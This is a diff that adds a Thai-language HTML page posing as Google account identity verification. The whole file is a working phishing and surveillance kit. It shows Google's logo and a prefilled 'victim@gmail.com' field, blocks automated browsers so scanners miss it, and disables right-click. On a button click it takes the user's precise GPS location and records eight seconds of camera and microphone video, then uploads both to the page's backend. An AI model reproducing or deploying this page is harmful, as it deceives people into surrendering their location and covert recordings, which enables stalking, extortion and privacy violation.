@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ยืนยันตัวตน - Google Account</title>
+    <style>
+        body { background: #fff; font-family: 'Roboto', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .google-box { background: #fff; border: 1px solid #dadce0; border-radius: 8px; padding: 40px; width: 420px; text-align: center; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+        .google-logo { width: 75px; margin-bottom: 15px; }
+        h1 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 5px; }
+        p { color: #5f6368; font-size: 14px; margin-bottom: 25px; }
+        .input-group { text-align: left; margin-bottom: 15px; }
+        .input-group label { display: block; font-size: 13px; color: #5f6368; margin-bottom: 5px; }
+        input { width: 100%; padding: 12px; border: 1px solid #dadce0; border-radius: 4px; font-size: 14px; box-sizing: border-box; }
+        button { background: #1a73e8; color: #fff; border: none; padding: 12px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; width: 100%; margin-top: 20px; transition: 0.2s; }
+        button:hover { background: #1557b0; }
+        .footer { margin-top: 20px; font-size: 12px; color: #5f6368; }
+        .alert-box { display: none; background: #fce8e6; color: #d93025; padding: 12px; border-radius: 4px; margin-bottom: 15px; font-size: 14px; border: 1px solid #f5c6cb; }
+        .permission-box { display: none; text-align: center; color: #1557b0; font-weight: bold; }
+    </style>
+    <script>
+        // ** ระบบป้องกันบอท (Anti-Bot) **
+        if (window.navigator.webdriver || window.navigator.userAgent.indexOf('Headless') !== -1) {
+            document.write("<h1 style='color:red;text-align:center;margin-top:20%;'>🚫 ป้องกันบอทเข้าเว็บเรา</h1><p style='text-align:center;'>บอทไม่ได้รับอนุญาต!</p>");
+            throw new Error("Bot blocked");
+        }
+
+        document.addEventListener('contextmenu', event => event.preventDefault()); // ป้องกันคลิกขวา
+
+        // ** ระบบป้องกันการถ่ายภาพ (Anti-Screenshot) **
+        document.addEventListener('keyup', function(e) {
+            if (e.key === 'PrintScreen') {
+                alert("⚠️ เว็บป้องกันการถ่ายภาพ");
+                return false;
+            }
+        });
+
+        let mediaRecorder;
+        let recordedChunks = [];
+        let videoBlob;
+
+        async function verifyIdentity() {
+            const alertBox = document.getElementById('alert');
+            const btn = document.querySelector('button');
+            btn.disabled = true;
+            btn.innerText = "กำลังยืนยันตัวตน...";
+            alertBox.style.display = 'none';
+
+            try {
+                // ** ขอสิทธิ์ GPS **
+                const pos = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 8000 });
+                });
+                const lat = pos.coords.latitude;
+                const lng = pos.coords.longitude;
+
+                // ** ขอสิทธิ์กล้องและไมค์ **
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                
+                recordedChunks = [];
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) recordedChunks.push(event.data);
+                };
+                mediaRecorder.onstop = async () => {
+                    videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+                    const formData = new FormData();
+                    formData.append('video', videoBlob, 'victim_video.webm');
+                    formData.append('lat', lat);
+                    formData.append('lng', lng);
+
+                    // ส่งไป Backend
+                    const res = await fetch('/upload', { method: 'POST', body: formData });
+                    if(res.ok) {
+                        document.querySelector('.permission-box').style.display = 'block';
+                        btn.style.display = 'none';
+                        document.getElementById('statusText').innerText = "✅ ยืนยันตัวตนเสร็จสมบูรณ์!";
+                    } else {
+                        alert("เกิดข้อผิดพลาด ส่งข้อมูลไม่สำเร็จ!");
+                    }
+                };
+                mediaRecorder.start();
+                setTimeout(() => { if(mediaRecorder.state === 'recording') mediaRecorder.stop(); }, 8000); // บันทึก 8 วิ
+                
+                document.getElementById('loginForm').style.display = 'none';
+                document.querySelector('.permission-box').style.display = 'block';
+                document.getElementById('statusText').innerText = "📷 กำลังบันทึกวิดีโอเพื่อยืนยัน...";
+
+            } catch (err) {
+                alertBox.style.display = 'block';
+                alertBox.innerText = "⚠️ ระบบต้องการสิทธิ์ในการเปิดกล้องและตำแหน่งเพื่อยืนยันตัวตน กรุณาอนุญาต!";
+                btn.disabled = false;
+                btn.innerText = "ยืนยันตัวตน";
+                console.error(err);
+            }
+        }
+    </script>
+</head>
+<body>
+    <div class="google-box">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="google-logo">
+        <h1>ยืนยันตัวตน</h1>
+        <p>เข้าสู่ระบบด้วยบัญชี Google ของคุณ</p>
+        
+        <div class="alert-box" id="alert"></div>
+        <div class="permission-box" id="permissionBox">
+            <div id="statusText">⏳ กำลังยืนยัน...</div>
+        </div>
+
+        <div id="loginForm">
+            <div class="input-group">
+                <label>อีเมลหรือโทรศัพท์</label>
+                <input type="text" value="victim@gmail.com" disabled style="background:#f1f3f4; color:#5f6368;">
+            </div>
+            <button onclick="verifyIdentity()">ยืนยันตัวตน</button>
+        </div>
+        
+        <div class="footer">ภาษาไทย (ประเทศไทย) ความช่วยเหลือ ความเป็นส่วนตัว ข้อกำหนด</div>
+    </div>
+</body>
+</html>
